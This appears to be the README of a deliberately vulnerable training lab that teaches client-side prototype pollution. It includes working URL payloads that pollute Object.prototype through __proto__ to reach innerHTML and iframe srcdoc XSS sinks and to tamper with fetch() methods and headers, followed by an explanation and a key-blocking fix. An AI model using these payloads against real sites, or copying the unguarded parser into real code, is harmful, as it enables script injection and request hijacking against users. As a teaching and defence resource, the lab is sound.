# Client-Side Prototype Pollution → DOM XSS & Fetch Hijacking

## Scenario

Acme Store makes search URLs shareable, so its frontend parses nested query
parameters into JavaScript objects.

A developer wrote a tiny recursive parameter parser. It does not block
`__proto__`.

Later, UI code reads optional properties from a normal configuration object.
Because JavaScript property lookup includes the prototype chain, polluted
properties become visible to that object.

## Goal

Trigger JavaScript execution through either DOM XSS gadget:

- `config.html` → `innerHTML`
- `config.preview` → `iframe.srcdoc`

Or hijack the `fetch()` request the page sends to `/api/products` by polluting
"forgotten" request options:

- `options.method` (HTTP method)
- `options.headers` (arbitrary headers)
- any other fetch option (`credentials`, `mode`, ...)

## Setup

```bash
npm install
npm start
```

Open:

http://localhost:3000

## Intended discovery

First prove the source:

```text
http://localhost:3000/?__proto__[test]=polluted
```

Then check:

```js
Object.prototype.test
```

You should see:

```text
"polluted"
```

Now use the `html` gadget:

```text
http://localhost:3000/?__proto__[html]=%3Cimg%20src=x%20onerror=alert(document.domain)%3E
```

Or the `srcdoc` gadget:

```text
http://localhost:3000/?__proto__[preview]=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
```

Now hijack the search request. Pollute fetch options that the code never sets:

```text
http://localhost:3000/?q=laptop&__proto__[headers][X-Debug]=pwned
```

The backend logs every request; check its console or open:

```text
http://localhost:3000/api/searches
```

You should see the injected header arrive at the server with the search.

Direct (non-polluting) injection also works through `request[...]` params:

```text
http://localhost:3000/?q=laptop&request[method]=DELETE&request[headers][X-Pwn]=1
```

## Why fetch() is affected

`fetchProducts()` builds its options object empty and merges user settings in
without blocking dangerous keys:

```js
const options = {};
for (const key of Object.keys(settings)) {
  setDeep(options, [key], settings[key]);
}
```

When fetch() later reads `options.method` or `options.headers`, those are not
own properties of the empty object, so lookup walks the prototype chain:

```text
options → Object.prototype → headers
```

Any property planted on `Object.prototype` by the parser silently rewrites
every outgoing request.

## Why it happens

The vulnerable operation is effectively:

```js
current["__proto__"]["html"] = attackerValue;
```

`__proto__` resolves to `Object.prototype`, so the assignment adds a property
to the global object prototype.

Then:

```js
const config = { term: "phone" };

config.html
```

does not need `html` to be an own property. JavaScript finds it through:

```text
config → Object.prototype → html
```

That turns prototype pollution into control of a DOM XSS sink.

## Fix

Reject dangerous keys while parsing or merging:

```js
const blocked = new Set(["__proto__", "prototype", "constructor"]);
if (blocked.has(key)) return;
```

Also prefer safe object creation / merging patterns and avoid using attacker-
controlled properties directly in HTML or `srcdoc` sinks.
